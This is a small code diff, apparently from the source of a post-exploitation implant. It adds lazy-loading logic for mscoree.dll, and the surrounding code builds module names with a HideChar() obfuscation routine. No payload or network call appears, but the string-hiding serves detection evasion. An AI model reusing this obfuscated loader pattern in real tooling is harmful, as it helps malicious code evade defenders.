@@ -64,10 +64,14 @@ BOOL RtAdvapi32(
     return TRUE;
 }
 
+// we delay loading mscoree.dll
 BOOL RtMscoree(
     VOID
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
+
+    if ( Instance.Win32.CLRCreateInstance )
+        return TRUE;
 
     ModuleName[ 1  ] = HideChar('S');
     ModuleName[ 2  ] = HideChar('C');
